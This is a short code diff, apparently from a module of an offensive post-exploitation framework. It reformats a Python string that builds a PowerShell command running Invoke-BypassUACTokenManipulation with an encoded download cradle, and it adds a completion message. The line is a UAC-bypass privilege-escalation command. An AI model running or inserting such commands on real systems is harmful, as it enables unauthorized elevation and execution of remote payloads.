@@ -43,8 +43,6 @@ class Module:
         except Exception:
             pass
 
-        script_end = (
-            f'Invoke-BypassUACTokenManipulation -Arguments "-w 1 -enc {encoded_cradle}"'
-        )
+        script_end = f'Invoke-BypassUACTokenManipulation -Arguments "-w 1 -enc {encoded_cradle}";`n"Invoke-BypassUACTokenManipulation completed!"'
 
         return script, script_end
